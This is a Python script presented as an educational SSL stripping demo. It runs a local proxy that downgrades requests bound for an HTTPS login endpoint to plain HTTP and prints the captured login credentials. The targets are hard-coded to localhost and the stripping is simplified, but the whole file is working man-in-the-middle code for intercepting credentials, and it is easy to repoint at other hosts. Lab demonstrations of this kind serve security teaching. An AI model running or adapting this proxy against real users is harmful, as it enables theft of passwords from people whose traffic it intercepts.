#!/usr/bin/env python3
"""
SSL Strip Demonstration Script
This simulates how SSL stripping attacks work for educational purposes
"""

import socket
import threading
import re
import sys
from urllib.parse import urlparse

class SSLStripDemo:
    def __init__(self, listen_port=8080):
        self.listen_port = listen_port
        self.target_https_host = 'localhost'
        self.target_https_port = 5443
        self.target_http_port = 5000
        
    def handle_client(self, client_socket, address):
        """Handle incoming client connections"""
        print(f"[+] New connection from {address}")
        
        try:
            # Receive the HTTP request
            request = client_socket.recv(4096).decode('utf-8')
            print(f"[+] Received request:\n{request[:500]}...")
            
            # Check if this is a request to our HTTPS endpoint
            if 'https://localhost:5443' in request or '/api/auth/login' in request:
                print("[!] HTTPS request detected - performing SSL strip attack simulation")
                
                # Replace HTTPS with HTTP in the request
                modified_request = request.replace('https://localhost:5443', 'http://localhost:5000')
                modified_request = modified_request.replace('Host: localhost:5443', 'Host: localhost:5000')
                
                print("[!] Downgraded request to HTTP:")
                print(f"Modified request:\n{modified_request[:500]}...")
                
                # Forward to HTTP endpoint instead
                self.forward_to_http(client_socket, modified_request)
            else:
                # Normal forwarding
                self.forward_request(client_socket, request)
                
        except Exception as e:
            print(f"[-] Error handling client: {e}")
        finally:
            client_socket.close()
    
    def forward_to_http(self, client_socket, request):
        """Forward request to HTTP endpoint (simulating downgrade)"""
        try:
            # Connect to HTTP server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_https_host, self.target_http_port))
            
            # Send modified request
            server_socket.send(request.encode('utf-8'))
            
            # Receive response
            response = server_socket.recv(4096)
            
            # Log the captured credentials if this is a login request
            if b'login' in request.encode() and b'password' in request.encode():
                print("\n" + "="*50)
                print("[!] CAPTURED LOGIN CREDENTIALS (SSL STRIP ATTACK)")
                print("="*50)
                
                # Extract credentials from request body
                try:
                    body_start = request.find('\r\n\r\n')
                    if body_start != -1:
                        body = request[body_start + 4:]
                        print(f"Credentials: {body}")
                except:
                    pass
                print("="*50 + "\n")
            
            # Send response back to client
            client_socket.send(response)
            server_socket.close()
            
        except Exception as e:
            print(f"[-] Error forwarding to HTTP: {e}")
    
    def forward_request(self, client_socket, request):
        """Normal request forwarding"""
        # This would implement normal proxy functionality
        response = b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nProxy active"
        client_socket.send(response)
    
    def start_proxy(self):
        """Start the SSL strip proxy server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind(('localhost', self.listen_port))
            server_socket.listen(5)
            
            print(f"[+] SSL Strip Demo Proxy listening on localhost:{self.listen_port}")
            print(f"[+] Target HTTPS: {self.target_https_host}:{self.target_https_port}")
            print(f"[+] Target HTTP: {self.target_https_host}:{self.target_http_port}")
            print("[!] This will intercept HTTPS requests and downgrade them to HTTP")
            print("[!] Configure your browser proxy to localhost:8080 to test")
            print("="*60)
            
            while True:
                client_socket, address = server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[+] Shutting down proxy server...")
        except Exception as e:
            print(f"[-] Error starting proxy: {e}")
        finally:
            server_socket.close()

def main():
    print("SSL Strip Attack Demonstration")
    print("==============================")
    print("This script demonstrates how SSL stripping attacks work")
    print("It will intercept HTTPS requests and downgrade them to HTTP")
    print("For educational and testing purposes only!\n")
    
    # Create and start the SSL strip demo
    ssl_strip = SSLStripDemo()
    
    try:
        ssl_strip.start_proxy()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()